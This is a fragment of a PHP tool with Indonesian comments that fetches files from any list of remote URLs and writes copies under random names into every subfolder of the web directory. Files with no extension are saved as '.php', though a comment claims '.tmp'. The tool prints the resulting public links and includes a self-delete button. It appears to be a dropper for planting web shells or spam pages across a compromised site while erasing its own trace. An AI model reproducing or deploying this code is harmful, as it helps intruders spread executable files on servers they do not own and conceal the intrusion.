// 1. Fitur Kill File (Self-Destruct)
if (isset($_POST['kill_tools'])) {
    if (@unlink(__FILE__)) {
        die("<h3 style='color: green;'>[+] Tools berhasil dihapus dari server!</h3>");
    } else {
        die("<h3 style='color: red;'>[-] Gagal menghapus tools. Silakan hapus manual via File Manager.</h3>");
    }
}

$result_urls = [];

// 2. Eksekusi Tools
if (isset($_POST['run_tools'])) {
    // Mengambil input URL (bisa lebih dari satu, dipisahkan baris baru)
    $raw_urls = explode(PHP_EOL, $_POST['raw_urls']);
    
    // Deteksi otomatis semua subfolder (DIR) di lokasi script ini berada
    $subfolders = array_filter(glob(__DIR__ . '/*'), 'is_dir');
    
    // Jika tidak ada subfolder sama sekali, gunakan direktori saat ini (root folder script)
    if (empty($subfolders)) {
        $subfolders = [__DIR__];
    }

    // Mendapatkan Base URL website secara dinamis untuk output result
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $domain = $_SERVER['HTTP_HOST'];
    $base_dir = dirname($_SERVER['SCRIPT_NAME']);
    if ($base_dir == '/' || $base_dir == '\\') { rtrim($base_dir, '/\\'); } // Bersihkan trailing slash
    $base_url = $protocol . $domain . $base_dir;

    // Proses setiap URL Raw yang diinput
    foreach ($raw_urls as $url) {
        $url = trim($url);
        if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) continue;

        // Ambil ekstensi asli file (misal: .jpg, .pdf). Jika tidak terdeteksi, default ke .tmp
        $ext = pathinfo(parse_url($url, PHP_URL_PATH), PATHINFO_EXTENSION);
        $ext = $ext ? '.' . $ext : '.php';

        // Eksekusi upload ke *setiap* subfolder yang terdeteksi
        foreach ($subfolders as $folder) {
            // Generate nama file random (8 karakter huruf & angka)
            $random_filename = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8) . $ext;
            
            $save_path = $folder . DIRECTORY_SEPARATOR . $random_filename;
            $folder_name = basename($folder);

            // Inisialisasi cURL
            $ch = curl_init($url);
            $fp = fopen($save_path, 'wb');

            if ($fp !== false) {
                curl_setopt($ch, CURLOPT_FILE, $fp);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                
                curl_exec($ch);
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                
                curl_close($ch);
                fclose($fp);

                // Cek jika berhasil (HTTP 200)
                if ($http_code == 200) {
                    // Susun URL output
                    if ($folder === __DIR__) {
                        $result_urls[] = $base_url . '/' . $random_filename;
                    } else {
                        $result_urls[] = $base_url . '/' . $folder_name . '/' . $random_filename;
                    }
                } else {
                    @unlink($save_path); // Bersihkan file corrupt jika download gagal
                }
            }
        }
    }
}
